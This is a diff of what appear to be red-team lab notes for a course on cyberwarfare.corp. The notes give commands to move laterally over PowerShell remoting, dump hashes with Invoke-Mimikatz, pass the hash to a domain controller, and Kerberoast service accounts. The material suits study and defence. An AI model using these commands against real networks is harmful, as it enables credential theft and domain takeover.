@@ -247,27 +247,27 @@ Configuration: “**Enable-PSRemoting -SkipNetworkProfileCheck -Verbose -Force**
 ```powershell
 After checking which user has admin privilege over the domain controller or application
 server and we've opened a powershell session with the privilege. 
-Next thing we can do is to open a session on the **app-server.
+Next thing we can do is to open a session on the app-server.
 
 $session = NewPSSession -ComputerName app-server -Verbose.
 then run $session and the state should be opened
 
-Invoke-Command -Session $session -ScriptBlock {whoami;ipconfig} -Verbose -** This command 
+Invoke-Command -Session $session -ScriptBlock {whoami;ipconfig} -Verbose - This command 
 executes the whoami and ipconfig command on the app-server session(other words, on the 
 application server).
 
 Enter-PSSession -Session $session -Verbose. - To enter the app-server through the session
-Type whoami to confirm that we are now in the app-server as the **emp_svc** user.
+Type whoami to confirm that we are now in the app-server as the emp_svc user.
 Type hostname to see that we are in the APP-SERVER.
 
-**net user** to see the local users on the app-server
-**klist** to list all kerberos tickets.
+net user to see the local users on the app-server
+klist to list all kerberos tickets.
 
-Run **Invoke-Mimikatz -ComputerName app-server -Verbose** - To dump hashes on the app-server
+Run Invoke-Mimikatz -ComputerName app-server -Verbose - To dump hashes on the app-server
 And now we have the app-server hash.
 
-One of the users there is app-svc. We can inspect each user with **net user app-svc /domain
-And app-svc** is a member of **domain admin** group. **Domain admin** group holds the highest 
+One of the users there is app-svc. We can inspect each user with net user app-svc /domain
+And app-svc is a member of domain admin group. Domain admin group holds the highest 
 privilege in a domain.
 ```
 
@@ -275,7 +275,7 @@ privilege in a domain.
 
 ```powershell
 On the app-server, we run Invoke-Mimikatz.ps1
-run **c 
+run c 
 /ntlm:hash /run:powershell.exe"' -Verbose.
 Run . ./Powerview.ps1 script
 
@@ -289,7 +289,8 @@ Invoke-Command -Session $sess -ScriptBlock {ipconfig;whoami} -Verbose
 
 Enter-PSSession -Session $sess -Verbose
 
-Run whoami and we are now in the domain controller.**
+Run whoami and we are now in the domain controller.
+
 
 ```
 
@@ -299,12 +300,12 @@ Run whoami and we are now in the domain controller.**
 Kerberoating is simply extracting the Ntlm hash of the service account from the TGS and
 bruteforcing it.
 - Find User accounts used as a service account
-**Get-NetUser -SPN -Verbose**
+Get-NetUser -SPN -Verbose
 
 -Enumerate all SPNs on a domain
 setspn -T cyberwarfare.corp -Q */*
 
-**-** Request TGS aka service ticket  (Powerview.ps1)
+- Request TGS aka service ticket  (Powerview.ps1)
 Request-SPNTicket
 
 #Check the services running
@@ -314,9 +315,9 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 "HTTP/portal.cyberwarfare.corp"
 
 - Check ticket in memory
-**klist
+klist
 
--** Export ticket from memory using mimikatz:
+- Export ticket from memory using mimikatz:
 Invoke-Mimikatz -Command '"kerberos::list /export"'
 
 - Now Crack the service account password using tgsrepcrack.py
